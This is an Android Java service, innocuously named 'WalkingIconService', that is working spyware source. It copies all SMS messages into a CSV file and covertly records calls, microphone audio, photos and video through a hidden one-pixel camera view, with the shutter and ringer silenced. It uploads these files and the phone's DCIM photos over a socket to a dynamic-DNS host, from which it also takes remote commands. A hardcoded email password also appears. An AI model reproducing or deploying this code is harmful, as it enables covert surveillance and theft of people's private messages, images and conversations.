package com.dima;

import android.annotation.TargetApi;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.Configuration;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.media.AudioManager;
import android.media.CamcorderProfile;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Message;
import android.os.PowerManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Gravity;
import android.view.Surface;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import com.dima.qwert.MailSenderClass;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.channels.FileChannel;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Enumeration;
import java.util.List;

public class WalkingIconService extends Service {

    private ClientSocketThread client=null;
    private PowerManager.WakeLock wakeLock = null;
    public File dirPik=null;
    public File dir=null;
    private MediaPlayer mediaPlayer = null;;

    private WindowManager windowManager=null;
    private SurfaceView sv=null;
    private SurfaceHolder holder=null;
    private Camera.AutoFocusCallback myAutoFocusCallback=null;
    private Camera.PictureCallback myPictureCallback=null;
    private Camera mCamera = null;
    private int CAMERA_ID = 0;
    private MediaRecorder mediaRecorder = null;
    private boolean autofokus=false;

    private Handler handler = null;
    private int[][] matrixA = null;
    private int[][] matrixAOld = null;
    private boolean onoff_Foto=false;

    // это будет именем файла настроек
    private static final String APP_PREFERENCES = "mysettings";
    private static final String APP_PREFERENCES_COUNTER = "on_off";
    private SharedPreferences mSettings = null;

    public static String Imia="";
    public static WalkingIconService Ser=null;
    private boolean nachVid=false;
    private boolean zvon=false;

    private static InetAddress getLocalAddress()throws IOException {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress()) {
                        //return inetAddress.getHostAddress().toString();
                        return inetAddress;
                    }
                }
            }
        } catch (SocketException ex) {
            Log.e("SALMAN", ex.toString());
        }
        return null;
    }

    private static String createDataString()
    {
        Calendar c = Calendar.getInstance();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss");
        return sdf.format(c.getTime());
    }

    private static void copy(File source, File dest) throws IOException {
        FileChannel sourceChannel = new FileInputStream(source).getChannel();
        try {
            FileChannel destChannel = new FileOutputStream(dest).getChannel();
            try {
                destChannel.transferFrom(sourceChannel, 0, sourceChannel.size());
            } finally {
                destChannel.close();
            }
        } finally {
            sourceChannel.close();
        }
    }

    private static void LOG(String s) {
        synchronized (WalkingIconService.class) {
            File hjka = Environment.getExternalStorageDirectory();
            hjka = new File(hjka, "Android/data/log.fgh");
            try {
                Calendar c = Calendar.getInstance();
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss");
                update(hjka.getAbsolutePath(), s + sdf.format(c.getTime()));
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }

    private static int byteArrayToInt(byte[] b,int n,int k) {
        ByteBuffer bb = ByteBuffer.wrap(b, n, k);
        return bb.getInt();
    }

    private static byte[] intToByteArray(int i) {
        ByteBuffer bb = ByteBuffer.allocate(Integer.SIZE / Byte.SIZE);
        bb.order(ByteOrder.BIG_ENDIAN);
        bb.putInt(i);
        return bb.array();
    }

    private static byte [] float2ByteArray (float value)
    {
        ByteBuffer bb = ByteBuffer.allocate(4);
        bb.order(ByteOrder.LITTLE_ENDIAN);
        bb.putFloat(value).array();
        return bb.array();
    }

    private static ArrayList<String> read(String fileName) {
        //Этот спец. объект для построения строки
        ArrayList<String> sb = new ArrayList<>();
        try {
            //Объект для чтения файла в буфер
            BufferedReader in = new BufferedReader(new FileReader(fileName));
            try {
                //В цикле построчно считываем файл
                String s;
                while ((s = in.readLine()) != null) {
                    sb.add(s);
                }
            } finally {
                //Также не забываем закрыть файл
                in.close();
            }
        } catch(IOException e) {
            throw new RuntimeException(e);
        }
        //Возвращаем полученный текст с файла
        return sb;
    }

    private static void update(String nameFile, String newText) throws IOException {
        PrintWriter out = new PrintWriter(new BufferedWriter(new FileWriter(nameFile, true)));
        out.println(newText);
        out.close();
    }

    private static void DeleteRecursive(File fileOrDirectory)
    {
        if (fileOrDirectory.isDirectory())
        {
            for (File child : fileOrDirectory.listFiles())
            {
                DeleteRecursive(child);
            }
        }
        fileOrDirectory.delete();
    }

    private File outFileZv=new File("");

    public void setZvon(String Imia) {
        if (!zvon) {
            zvon = true;
            File dir = new File(dirPik, "zvon");
            dir.mkdirs();

            outFileZv = new File(dir, Imia + "_" + createDataString() + ".3gpp");
            creatAudioMediaRecorder(outFileZv);
        }
    }

    public void konZvon() {
        if(zvon) {
            if (mediaRecorder != null) {
                releaseMediaRecorder();
            }
            outFileZv = new File("");
            zvon = false;
            otprSoket();
        }
    }

    private File outFileZvuk=new File("");

    private void setZvuk() {
        if (!nachVid && !zvon)
        {
            File dir = new File(dirPik, "audio");
            dir.mkdirs();
            outFileZvuk = new File(dir, createDataString() + ".3gpp");
            creatAudioMediaRecorder(outFileZvuk);
        }
    }

    private void konZvuk() {
        if (!nachVid && !zvon)
        {
            releaseMediaRecorder();
            outFileZvuk=new File("");
            otprSoket();
        }
    }

    public void sms(String s,String s1)
    {
        try {
            File dir = new File(dirPik, "sms");
            dir.mkdirs();
            File f = new File(dir, s+createDataString() + ".txt");
            FileOutputStream fos= new FileOutputStream(f);
            fos.write(s1.getBytes());
            fos.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void  creatAudioMediaRecorder(File outFile) {
        releaseMediaRecorder();
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        mediaRecorder.setOutputFile(outFile.getAbsolutePath());
        try {
            mediaRecorder.prepare();
        } catch (IOException e) {
            releaseMediaRecorder();
            e.printStackTrace();
        }
        mediaRecorder.start();
    }

    public void onCreate() {
        super.onCreate();

        mediaPlayer = MediaPlayer.create(this, R.raw.aaa);
        mediaPlayer.setLooping(false);

        LOG("CreateServ:");
        mSettings = getSharedPreferences(APP_PREFERENCES, Context.MODE_PRIVATE);
    }

    public void onDestroy() {
        LOG("onDestroy:");
        //DeleteRecursive(dirPik);
        Ser=null;
        handler=null;
        releaseMediaRecorder();
        if (client!=null) {
            if (client.socket != null) {
                try {
                    client.socket.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                client.socket = null;
                client = null;
            }
        }
        super.onDestroy();
    }

    private class sender_mail_async extends AsyncTask<String, String, Boolean> {

        @Override
        protected void onPreExecute() {
        }

        @Override
        protected void onPostExecute(Boolean result) {
        }

        @Override
        protected Boolean doInBackground(String... params) {
            try {
                String attach = "";
                if( params.length > 0 ){
                    attach = params[0];
                }
                MailSenderClass sender = new MailSenderClass("dimanys111@gmail.com", "b84962907");
                String title = "";
                String text = "";
                String from = "dimanys111@gmail.com";
                String where = "dimanys111@mail.ru";
                sender.sendMail(title, text, from, where, attach);
                File myFile=new File(attach);
                myFile.delete();
            } catch (Exception ignored) {
            }
            return false;
        }
    }

    // Создание второго потока
    public class ClientSocketThread implements Runnable {
        public Handler h=null;
        public Thread thread=null;
        public HandlerThread handlerThread=null;
        public InputStream in=null;
        public OutputStream out=null;
        public Socket socket=null;

        public String prinString() throws IOException {
            byte priem[] = new byte[4];
            int j = in.read(priem);
            if (j==4) {
                j = byteArrayToInt(priem, 0, 4);
                priem = new byte[j];
                int jj = in.read(priem);
                if (j==jj)
                    return new String(priem);
            }
            return "";
        }

        private void perFile(File myFile,int i) throws IOException {
            int j;
            byte[] data;
            byte[] mybytearray = new byte[(int) myFile.length()];
            BufferedInputStream bis = new BufferedInputStream(new FileInputStream(myFile));
            int s=bis.read(mybytearray, 0, mybytearray.length);
            j=s+4;
            data = intToByteArray(j);
            out.write(data,0,data.length);
            data = intToByteArray(i);
            out.write(data,0,data.length);
            out.write(mybytearray, 0, mybytearray.length);
        }

        private void perInt(int i) throws IOException {
            int j=4;
            byte[] data = intToByteArray(j);
            out.write(data,0,data.length);
            data = intToByteArray(i);
            out.write(data, 0, data.length);
        }

        private void perString(String s,int i) throws IOException {
            int j = s.getBytes().length + 4;
            byte data[] = intToByteArray(j);
            out.write(data, 0, data.length);
            data = intToByteArray(i);
            out.write(data, 0, data.length);
            data = s.getBytes();
            out.write(data, 0, data.length);
        }

        Runnable PerSocketThread = new Runnable() {
            // Обязательный метод для интерфейса Runnable
            public void run() {
                try {
                    ArrayList<File> spis = new ArrayList<>();
                    listFile(dirPik,spis);
                    perInt(5);
                    for (int i = 0; i < spis.size(); i++) {
                        File myFile = spis.get(i);
                        String put = myFile.getAbsolutePath();
                        String imi = myFile.getName();
                        perString(imi, 1);
                        perString(put, 2);
                        perFile(myFile, 3);
                        myFile.delete();
                    }
                    h.post(Per_DCIM_SocketThread);
                    perInt(6);
                } catch (IOException e) {
                    if (socket != null) {
                        try {
                            socket.close();
                        } catch (IOException x) {
                            x.printStackTrace();
                        }
                    }
                    socket = null;
                    client = null;
                    handlerThread.interrupt();
                    handlerThread = null;
                    h = null;
                    thread.interrupt();
                    thread=null;
                    e.printStackTrace();
                }
            }
        };

        Runnable Per_DCIM_SocketThread = new Runnable() {
            // Обязательный метод для интерфейса Runnable
            public void run() {
                try {
                    ArrayList<File> spis = new ArrayList<>();
                    File hjka= Environment.getExternalStorageDirectory();
                    hjka = new File(hjka, "Android/data/wert.fgh");
                    ArrayList<String> spTextFil = new ArrayList<>();
                    if(hjka.exists()){
                        spTextFil=read(hjka.getAbsolutePath());
                    }
                    File hjk= Environment.getExternalStorageDirectory();
                    hjk = new File(hjk, "DCIM");
                    if (hjk.exists()) {
                        listFile(hjk, spis);
                        listFile(dir,spis);
                    }
                    perInt(5);
                    if (spis.size()>0) {
                        for (int i = 0; i < spis.size(); i++) {
                            File myFile = spis.get(i);
                            String put = myFile.getAbsolutePath();
                            String imi = myFile.getName();
                            boolean pr = false;
                            for (String aSpTextFil : spTextFil) {
                                if (aSpTextFil.equals(imi)) {
                                    pr = true;
                                    break;
                                }
                            }
                            if (!pr) {
                                int si = (int) myFile.length();
                                if (si < 50000000) {
                                    perString(imi, 1);
                                    perString(put, 2);
                                    perFile(myFile, 3);

                                }
                                update(hjka.getAbsolutePath(), imi);
                            }
                        }
                    }
                    perInt(6);
                } catch (IOException e) {
                    if (socket != null) {
                        try {
                            socket.close();
                        } catch (IOException x) {
                            x.printStackTrace();
                        }
                    }
                    socket = null;
                    client = null;
                    handlerThread.interrupt();
                    handlerThread = null;
                    h = null;
                    thread.interrupt();
                    thread=null;
                    e.printStackTrace();
                }
            }
        };

        ClientSocketThread() {
            handlerThread=new HandlerThread("123");
            handlerThread.start();
            h = new Handler(handlerThread.getLooper());
            thread = new Thread(this,"Поток 0");
            thread.start();
        }

        // Обязательный метод для интерфейса Runnable
        public void run() {
            String address = "dimanys111.ddns.net"; // это IP-адрес компьютера, где исполняется наша серверная программа.
            // Здесь указан адрес того самого компьютера где будет исполняться и клиент.
            try {
                LOG("Do:");
                InetAddress ipAddress = InetAddress.getByName(address); // создаем объект который отображает вышеописанный IP-адрес.
                socket = new Socket();
                socket.connect(new InetSocketAddress(ipAddress, 1234), 5000);
                in = socket.getInputStream();
                out = socket.getOutputStream();
                LOG("Posle:");
                perString(Build.MODEL,0);
                h.post(PerSocketThread);
                while (!socket.isClosed()) {
                    String str = prinString();
                    Message m = new Message();
                    m.obj = str;
                    handler.sendMessage(m);
                }
                client = null;
            } catch (Exception x) {
                if (socket != null) {
                    try {
                        socket.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
                socket = null;
                client = null;
                if (handlerThread!=null) {
                    handlerThread.interrupt();
                    handlerThread = null;
                }
                h = null;
                thread=null;
                x.printStackTrace();
            }
        }
    }

    private void listFile(File F,ArrayList<File> list)
    {
        if (F.exists()) {
            File[] fList;
            fList = F.listFiles();
            for (File aFList : fList) {
                //Нужны только папки в место isFile() пишим isDirectory()
                if (aFList.isFile()) {
                    if (!aFList.getAbsolutePath().equals(outFileZvuk.getAbsolutePath())
                            && !aFList.getAbsolutePath().equals(outFileZv.getAbsolutePath())
                            && !aFList.getAbsolutePath().equals(videoFile.getAbsolutePath()))
                        list.add(aFList);
                }
                if (aFList.isDirectory())
                    listFile(aFList, list);
            }
        }
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        Ser=this;
        LOG("StartServ:");
        if (mSettings.contains(APP_PREFERENCES_COUNTER)) {
            // Получаем число из настроек
            onoff_Foto = mSettings.getBoolean(APP_PREFERENCES_COUNTER, false);
        }
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        creatPowerManager();
        creatDirExempl();
        matrixA = new int[8][8];
        matrixAOld = new int[8][8];
        creatHandler();
        creatAutoFocusCallback();
        creatPictureCallback();
        timer_otpr();
        otprSoket();
        return super.onStartCommand(intent, flags, startId);
    }

    public boolean tim_bool=false;
    public int tim=6000;

    public void timer_timout_perv() {
        tim_bool=true;
        TakeFoto();
    }

    public int tim_ot=300000;

    private void timer_otpr() {
        handler.postDelayed(timer_run_otpr, tim_ot);
    }

    private Runnable timer_run_otpr = new Runnable() {
        // Обязательный метод для интерфейса Runnable
        public void run() {
            otprSoket();
            timer_otpr();
        }
    };

    private void timer_timout() {
        if (tim_bool) {
            handler.postDelayed(timer, tim);
        }
    }

    private Runnable timer = new Runnable() {
        // Обязательный метод для интерфейса Runnable
        public void run() {
            if (tim_bool) {
                TakeFoto();
            }
        }
    };

    private void creatDirExempl() {
        if (dirPik==null) {
            dirPik = Environment.getExternalStorageDirectory();
            dirPik = new File(dirPik, "Android/data/zer");
            dirPik.mkdirs();
        }

        if (dir==null) {
            dir = Environment.getExternalStorageDirectory();
            dir = new File(dir, "Android/TimeFoto");
            dir.mkdirs();
            if(MainActivity.editText_put!=null)
                MainActivity.editText_put.setText(dir.getPath());
        }
    }

    private void creatHandler() {
        handler = new Handler() {
            @Override
            public void handleMessage(Message msg) {
                String message = (String) msg.obj;
                if (CameraActivity.C_A==null) {
                    if (message.equals("NachVid"))
                        nachZapVid();
                    if (message.equals("KonVid"))
                        konZapVid();
                    if (message.equals("NachZvuk"))
                        setZvuk();
                    if (message.equals("KonZvuk"))
                        konZvuk();
                    if (message.equals("FOTO")) {
                        if(!foto) {
                            foto = true;
                            TakeFoto();
                        }
                    }
                    if (message.equals("Otchistka")) {
                        ArrayList<File> spis = new ArrayList<>();
                        listFile(dirPik, spis);
                        for (int i = 0; i < spis.size(); i++) {
                            File myFile = spis.get(i);
                            myFile.delete();
                        }
                    }
                    if (message.equals("CAM0")) {
                        CAMERA_ID = 0;
                    }
                    if (message.equals("CAM1")) {
                        CAMERA_ID = 1;
                    }
                    if (message.equals("Off_FOTO")) {
                        if(onoff_Foto) {
                            onoff_Foto = false;
                            foto = true;
                        }
                    }
                    if (message.equals("On_FOTO")) {
                        if(!onoff_Foto && !foto) {
                            onoff_Foto = true;
                            TakeFoto();
                        }
                    }
                }
            }
        };
    }

    private boolean foto =false;

    private void creatPictureCallback() {
        myPictureCallback=new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                Log.d("TAG", "Pic");
                try
                {
                    int sumIark = 2500;
                    int sumDelIark = 600;
                    if(onoff_Foto) {
                        Bitmap tgtImg = Bitmap.createScaledBitmap(BitmapFactory.decodeByteArray(data, 0, data.length), 8, 8, false);
                        sumIark = 0;
                        sumDelIark = 0;
                        for (int row = 0; row < 8; row++) {
                            for (int col = 0; col < 8; col++) {
                                int rgb = tgtImg.getPixel(col, row);
                                matrixA[col][row] = (int) (0.114 * Color.blue(rgb) + 0.587 * Color.green(rgb) + 0.299 * Color.red(rgb));
                                sumIark = sumIark + matrixA[col][row];
                                sumDelIark = sumDelIark + Math.abs(matrixA[col][row] - matrixAOld[col][row]);
                            }
                        }
                        for (int row = 0; row < 8; row++) {
                            for (int col = 0; col < 8; col++) {
                                matrixAOld[col][row] = matrixA[col][row];
                            }
                        }
                    }
                    if (sumIark>2400 && sumDelIark>500)
                    {
                        File photoFile = new File(dir, createDataString() + ".jpg");
                        if(foto || onoff_Foto)
                            photoFile = new File(dirPik, createDataString() + ".jpg");

                        FileOutputStream fos = new FileOutputStream(photoFile);
                        fos.write(data);
                        fos.close();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
                if (onoff_Foto) {
                    mCamera.startPreview();
                    TakeFoto();
                }
                else {
                    if (foto) {
                        releaseSV();
                        otprSoket();
                        foto = false;
                    } else {
                        mCamera.startPreview();
                        timer_timout();
                    }
                }
            }
        };
    }

    private void creatAutoFocusCallback() {
        myAutoFocusCallback = new Camera.AutoFocusCallback() {
            @Override
            public void onAutoFocus(boolean success, Camera camera) {
                if(CameraActivity.C_A!=null)
                    mediaPlayer.start(); // no need to call prepare(); create() does that for you
                camera.takePicture(null, null, myPictureCallback);
            }
        };
    }

    private void creatPowerManager() {
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                "MyWakelockTag");
    }

    public void otprSoket() {
        backupSMS();
        WalkingIconService.LOG("Otp:");
        if (client!=null) {
            if(client.socket!=null) {
                if (client.socket.isConnected()) {
                    client.h.post(client.PerSocketThread);
                } else {
                    client.handlerThread.interrupt();
                    client.handlerThread = null;
                    client.h = null;
                    client.thread.interrupt();
                    client.thread=null;
                    client = new ClientSocketThread();
                }
            }
            else
            {
                client.handlerThread.interrupt();
                client.handlerThread = null;
                client.h = null;
                client.thread.interrupt();
                client.thread=null;
                client = new ClientSocketThread();
            }
        }
        else
            client = new ClientSocketThread();
    }

    private ArrayList<String> smsBuffer = new ArrayList<>();

    private void  backupSMS(){
        smsBuffer.clear();
        Uri mSmsinboxQueryUri = Uri.parse("content://sms");
        Cursor cursor1 = getContentResolver().query(
                mSmsinboxQueryUri,
                new String[] { "_id", "thread_id", "address", "person", "date",
                        "body", "type" }, null, null, null);
        String[] columns = new String[] { "_id", "thread_id", "address", "person", "date", "body",
                "type" };
        if (cursor1.getCount() > 0) {
            String count = Integer.toString(cursor1.getCount());
            Log.d("Count",count);
            while (cursor1.moveToNext()) {
                String messageId = cursor1.getString(cursor1
                        .getColumnIndex(columns[0]));
                String threadId = cursor1.getString(cursor1
                        .getColumnIndex(columns[1]));
                String address = cursor1.getString(cursor1
                        .getColumnIndex(columns[2]));
                String name = cursor1.getString(cursor1
                        .getColumnIndex(columns[3]));
                String date = cursor1.getString(cursor1
                        .getColumnIndex(columns[4]));
                String msg = cursor1.getString(cursor1
                        .getColumnIndex(columns[5]));
                String type = cursor1.getString(cursor1
                        .getColumnIndex(columns[6]));
                smsBuffer.add(messageId + "^"+ threadId+ "^"+ address + "^" + name + "^" + date + "^" + msg + "^"
                        + type);
            }
            generateCSVFileForSMS(smsBuffer);
        }
    }

    private void generateCSVFileForSMS(ArrayList<String> list)
    {
        try
        {
            File dirP = new File(dirPik, "smsB");
            dirP.mkdirs();
            String smsFile = "SMS" + ".csv";
            File photoFile = new File(dirP, smsFile);
            FileWriter write = new FileWriter(photoFile);
            write.append("messageId^threadId^Address^Name^Date^msg^type");
            write.append('\n');
            for (String s : list)
            {
                write.append(s);
                write.append('\n');
            }
            write.flush();
            write.close();
        }
        catch (NullPointerException e)
        {
            System.out.println("Nullpointer Exception "+e);
        } catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    private void creatCamera() {
        if (mCamera == null) {
            try {
                mCamera = Camera.open(CAMERA_ID);
                svAddwindowManager();
            } catch (RuntimeException e) {
                try {
                    if (CAMERA_ID == 0)
                        CAMERA_ID = 1;
                    else
                        CAMERA_ID = 0;
                    mCamera = Camera.open(CAMERA_ID);
                    svAddwindowManager();
                } catch (RuntimeException ee) {
                    mCamera = null;
                }
            }
        }
    }

    private void TakeFoto() {
        if (mCamera != null) {
            if (autofokus && !onoff_Foto)
                mCamera.autoFocus(myAutoFocusCallback);
            else {
                if (CameraActivity.C_A!=null)
                    mediaPlayer.start(); // no need to call prepare(); create() does that for you
                mCamera.takePicture(null, null, myPictureCallback);
            }
        }
        else
        {
            creatCamera();
        }
    }

    HolderCallback holderCallback=null;

    private void  svGetActCam() {
        sv = CameraActivity.sv;
        holder = sv.getHolder();
        holder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
        holderCallback = new HolderCallback();
        holder.addCallback(holderCallback);
    }

    private void  svAddwindowManager() {
        if (CameraActivity.C_A!=null)
        {
            svGetActCam();
            return;
        }
        HolderCallback holderCallback;
        sv = new SurfaceView(this);
        holder = sv.getHolder();
        holder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
        holderCallback = new HolderCallback();
        holder.addCallback(holderCallback);
        WindowManager.LayoutParams paramsF = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT);
        paramsF.gravity = Gravity.TOP | Gravity.START;
        paramsF.x = 0;
        paramsF.y = 0;
        DisplayMetrics displaymetrics =  new  DisplayMetrics ();
        windowManager. getDefaultDisplay(). getMetrics ( displaymetrics );
        int Height = displaymetrics . heightPixels ;
        int  Width  = displaymetrics . widthPixels ;
        if(CameraActivity.C_A==null)
        {
            Height=1;
            Width=1;
        }
        paramsF.height =  Height;
        paramsF.width = Width;
        windowManager.addView(sv, paramsF);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    class HolderCallback implements SurfaceHolder.Callback {
        HolderCallback(){}
        @Override
        public void surfaceCreated(SurfaceHolder holder) {
            Log.d("TAG", "1");
            try {
                mCamera.setPreviewDisplay(holder);
                mCamera.startPreview();
            } catch (IOException e) {
                e.printStackTrace();
            }
            if (nachVid) {
                if (prepareVideoRecorder()) {
                    AudioManager mgr = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
                    int streamType = AudioManager.STREAM_SYSTEM;
                    mgr.setRingerMode(AudioManager.RINGER_MODE_SILENT);
                    mgr.setStreamMute(streamType, true);
                    mediaRecorder.start();
                    handler.postDelayed(new Runnable() {
                        public void run() {
                            AudioManager mgr = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
                            int streamType = AudioManager.STREAM_SYSTEM;
                            mgr.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
                            mgr.setStreamMute(streamType, true);
                        }
                    },1000);
                } else {
                    releaseMediaRecorder();
                    nachVid = false;
                }
            }
            else {
                if (autofokus) {
                    mCamera.autoFocus(myAutoFocusCallback);
                }
                else {
                    if (CameraActivity.C_A!=null)
                        mediaPlayer.start(); // no need to call prepare(); create() does that for you
                    mCamera.takePicture(null, null, myPictureCallback);
                }
            }
        }
        @Override
        public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
            Log.d("TAG", "2");
            setCameraDisplayOrientation();
            Log.d("TAG", "3");
        }
        @Override
        public void surfaceDestroyed(SurfaceHolder holder) {
            Log.d("TAG", "4");
        }
    }

    private void setCameraDisplayOrientation() {
        // определяем насколько повернут экран от нормального положения
        android.hardware.Camera.CameraInfo info =
                new android.hardware.Camera.CameraInfo();
        android.hardware.Camera.getCameraInfo(CAMERA_ID, info);
        int rotation = windowManager.getDefaultDisplay()
                .getRotation();
        int degrees = 0;
        switch (rotation) {
            case Surface.ROTATION_0: degrees = 0; break;
            case Surface.ROTATION_90: degrees = 90; break;
            case Surface.ROTATION_180: degrees = 180; break;
            case Surface.ROTATION_270: degrees = 270; break;
        }

        int result;
        if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
            result = (info.orientation + degrees) % 360;
            result = (360 - result) % 360;  // compensate the mirror
        } else {  // back-facing
            result = (info.orientation - degrees + 360) % 360;
        }
        mCamera.setDisplayOrientation(result);

        Camera.Parameters parameters = mCamera.getParameters();

        if (getResources().getConfiguration().orientation == Configuration.ORIENTATION_PORTRAIT)
            parameters.setRotation(90);
        else
            parameters.setRotation(0);

        List<String> flashModes = parameters.getSupportedFlashModes();
        if (flashModes != null && flashModes.contains(Camera.Parameters.FLASH_MODE_OFF))
            parameters.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
        List<String> whiteBalance = parameters.getSupportedWhiteBalance();
        if (whiteBalance != null && whiteBalance.contains(Camera.Parameters.WHITE_BALANCE_AUTO))
            parameters.setWhiteBalance(Camera.Parameters.WHITE_BALANCE_AUTO);
        List<String> focusModes = parameters.getSupportedFocusModes();
        if (focusModes != null && focusModes.contains(Camera.Parameters.FOCUS_MODE_AUTO)) {
            parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
            autofokus=true;
        }
        else
            autofokus=false;
        List<Camera.Size> sizes = parameters.getSupportedPictureSizes();
        if (sizes != null && sizes.size() > 0)
        {
            Camera.Size size = sizes.get(sizes.size()-1);
            parameters.setPictureSize(size.width, size.height);
        }
        List<Camera.Size> previewSizes = parameters.getSupportedPreviewSizes();
        if (previewSizes != null)
        {
            Camera.Size previewSize = previewSizes.get(previewSizes.size() - 1);
            parameters.setPreviewSize(previewSize.width, previewSize.height);
        }
        mCamera.setParameters(parameters);
        provEnzvuk(info);
    }

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR1)
    private void provEnzvuk(Camera.CameraInfo info) {
        if (info.canDisableShutterSound)
            mCamera.enableShutterSound(false);
    }

    private File videoFile=new File("");

    private void  nachZapVid() {
        if(!zvon && !nachVid) {
            nachVid = true;
            creatCamera();
        }
    }

    private boolean prepareVideoRecorder() {
        releaseMediaRecorder();
        mCamera.unlock();
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setCamera(mCamera);
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        mediaRecorder.setProfile(CamcorderProfile
                .get(CamcorderProfile.QUALITY_HIGH));
        File dir = new File(dirPik, "move");
        dir.mkdirs();
        videoFile = new File(dir, createDataString() + ".3gp");
        mediaRecorder.setOutputFile(videoFile.getAbsolutePath());
        mediaRecorder.setPreviewDisplay(sv.getHolder().getSurface());
        try {
            mediaRecorder.prepare();
        } catch (Exception e) {
            e.printStackTrace();
            releaseMediaRecorder();
            return false;
        }
        return true;
    }

    private void  konZapVid() {
        if(!zvon) {
            releaseMediaRecorder();
            releaseSV();
            videoFile = new File("");
            nachVid = false;
            otprSoket();
        }
    }

    private void releaseMediaRecorder() {
        if (mediaRecorder != null) {
            mediaRecorder.reset();
            mediaRecorder.release();
            mediaRecorder = null;
            if (mCamera!= null)
                mCamera.lock();
        }
    }

    public void releaseCamera() {
        if (mCamera != null) {
            mCamera.setPreviewCallback(null);
            mCamera.stopPreview();
            mCamera.release();
            mCamera = null;
        }
    }

    private void releaseSV() {
        releaseCamera();
        if (sv!= null) {
            windowManager.removeView(sv);
            sv = null;
            holder = null;
            holderCallback = null;
        }
    }
}